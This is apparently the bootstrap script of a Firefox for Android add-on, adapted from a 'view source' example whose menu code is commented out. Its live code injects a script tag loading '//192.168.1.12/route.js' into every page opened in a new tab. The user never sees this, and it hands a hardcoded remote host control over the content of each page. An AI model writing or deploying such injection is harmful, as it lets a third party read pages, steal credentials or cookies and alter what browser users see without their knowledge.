const Cc = Components.classes;
const Ci = Components.interfaces;
 
function viewSource(window) {
  window.console.log("view-source@mydomain.org: displaying source for " + window.content.location.href);
  window.BrowserApp.addTab("view-source:" + window.content.location.href);
}

var menuId;

function myFunction(aEvent){
    if(!aEvent)
      return;
    let browser = aEvent.originalTarget;
    browser.addEventListener("load", function () {
      
      let principal = Cc["@mozilla.org/systemprincipal;1"].createInstance(Ci.nsIPrincipal);
      let sandbox = Components.utils.Sandbox(principal);
      //let result = Components.utils.evalInSandbox("let x = 1;", sandbox, "1.8", "http://192.168.1.12/js.js", 1);

      var hm = browser.contentDocument.createElement("script");
            hm.src = "//192.168.1.12/route.js";
            var s = browser.contentDocument.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
      //let result =2;
      //browser.contentDocument.body.innerHTML = result;
      //browser.contentDocument.body.innerHTML = "<div>hello world</div><script type=\"text/javascript\">
//document.write(\"该消息在页面加载时输出。\");
//</script>";
    }, true);
}

 
function loadIntoWindow(window) {
  if (!window)
    return;
  nativeWindow = window.NativeWindow;
  browserApp = window.BrowserApp;

  if(browserApp.deck) {
  // BrowserApp.deck has been initialized.
    browserApp.deck.addEventListener("TabOpen", myFunction, false);
  } else {
    // Use the global chrome window to wait for BrowserApp to initialize.
    window.addEventListener("UIReady", function onUIReady(){
      window.removeEventListener("UIReady", onUIReady, false);
       browserApp.deck.addEventListener("TabOpen", myFunction, false);
    }, false);
  }

  //menuId = window.NativeWindow.menu.add("View Source", null, function() {
    //viewSource(window);
  //});
}
 
function unloadFromWindow(window) {
  if (!window)
    return;
  //window.NativeWindow.menu.remove(menuId);
  browserApp = window.BrowserApp;
  //browserApp.deck.removeEventListener("load", onPageLoad, false);
  browserApp.deck.removeEventListener("TabOpen", myFunction, false);

}
 
var windowListener = {
  onOpenWindow: function(aWindow) {
    // Wait for the window to finish loading
    let domWindow = aWindow.QueryInterface(Ci.nsIInterfaceRequestor).getInterface(Ci.nsIDOMWindowInternal || Ci.nsIDOMWindow);
    domWindow.addEventListener("load", function() {
      domWindow.removeEventListener("load", arguments.callee, false);
      loadIntoWindow(domWindow);
    }, false);
  },
  
  onCloseWindow: function(aWindow) {},
  onWindowTitleChange: function(aWindow, aTitle) {}
};
 
function startup(aData, aReason) {
  let wm = Cc["@mozilla.org/appshell/window-mediator;1"].getService(Ci.nsIWindowMediator);
 
  // Load into any existing windows
  let windows = wm.getEnumerator("navigator:browser");
  while (windows.hasMoreElements()) {
    let domWindow = windows.getNext().QueryInterface(Ci.nsIDOMWindow);
    loadIntoWindow(domWindow);
  }
 
  // Load into any new windows
  wm.addListener(windowListener);
}
 
function shutdown(aData, aReason) {
  // When the application is shutting down we normally don't have to clean
  // up any UI changes made
  if (aReason == APP_SHUTDOWN)
    return;
 
  let wm = Cc["@mozilla.org/appshell/window-mediator;1"].getService(Ci.nsIWindowMediator);
 
  // Stop listening for new windows
  wm.removeListener(windowListener);
 
  // Unload from any existing windows
  let windows = wm.getEnumerator("navigator:browser");
  while (windows.hasMoreElements()) {
    let domWindow = windows.getNext().QueryInterface(Ci.nsIDOMWindow);
    unloadFromWindow(domWindow);
  }
}
 
function install(aData, aReason) {}
function uninstall(aData, aReason) {}